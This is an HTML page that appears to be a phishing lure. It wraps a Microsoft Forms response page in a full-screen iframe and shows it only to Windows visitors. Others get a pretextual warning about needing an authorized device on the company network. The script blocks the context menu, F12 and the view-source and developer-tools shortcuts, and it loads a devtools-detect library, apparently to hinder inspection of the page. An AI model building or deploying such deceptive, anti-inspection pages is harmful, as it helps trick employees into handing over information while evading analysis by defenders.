<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Form</title>
  <link rel="icon" href="./1d7c66_5326f3b0f9e5419fa3bf19125ec1b33b~mv2.ico" type="image/x-icon">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/devtools-detect/1.0.0/devtools-detect.min.js"></script>

  <style>
    *{
        padding: 0;
        margin: 0;
        box-sizing: border-box;
    }

    #canvas-container {
      position: relative;
      width: 100vw; 
      height: 100vh; 
      overflow: hidden; 
      display: none;
    }


    #myCanvas {
      position: absolute;
      top: 0;
      left: 0;
      width: 100vw; 
      height: 100vh; 
      z-index: 1;
    }

   
    #form-container {
      position: absolute;
      top: 0;
      left: 0;
      width: 100vw; 
      height: 100vh; 
      border: none;
      z-index: 2; 
    }


    iframe {
      width: 100%;
      height: 100%;
    }

    #warning-message {
        width: 90%;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: rgb(255, 0, 0);
      color: white;
      padding: 20px;
      font-size: 20px;
      text-align: center;
      border-radius: 10px;
      z-index: 3;
      display: none; 
    }
  </style>
</head>
<body oncontextmenu="return false">

<div id="canvas-container">

  <canvas id="myCanvas"></canvas>

  <iframe id="form-container" src="https://forms.office.com/Pages/ResponsePage.aspx?id=sQxdbJqI_UawnwViZ-JWh4sIZrheyTFOtnhgt26CzAlUNkhHTEo5R1RFSUdIWjBCNVFWV0Y5R1BZNCQlQCN0PWcu" frameborder="0" allowfullscreen></iframe>
</div>

<div id="warning-message">
  This form can only be accessed on a Windows PC within your company's network. Please ensure you are using an authorized device.
</div>

<script>

     
  // Check if the device is Windows
  if (navigator.platform.indexOf('Win') > -1) {
    // Show canvas if on Windows
    document.getElementById('canvas-container').style.display = 'block';

    // Setup Canvas
    var canvas = document.getElementById('myCanvas');
    var ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth; // Set canvas to full window width
    canvas.height = window.innerHeight; // Set canvas to full window height

    // Draw background or any canvas content (for instance, a title or description)
    ctx.fillStyle = '#f0f0f0'; // Background color
    ctx.fillRect(0, 0, canvas.width, canvas.height); // Fill the entire canvas

    ctx.fillStyle = '#333'; // Text color
    ctx.font = '30px Arial'; // Text font size
    ctx.fillText('Fill out the Form Below', 50, 50); // Add text to canvas
  } else {
    // Show warning message if not on Windows
    document.getElementById('warning-message').style.display = 'block';
    document.getElementById('form-container').style.display = 'none';
  }

    document.addEventListener('contextmenu', event=> event.preventDefault()); 
      
      document.onkeydown = function(e) { 
      if(event.keyCode == 123) { 
      return false; 
      } 
      if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){ 
      return false; 
      } 
      if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){ 
      return false; 
      } 
      if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){ 
      return false; 
      } 
      } 

  

</script>




</body>
</html>
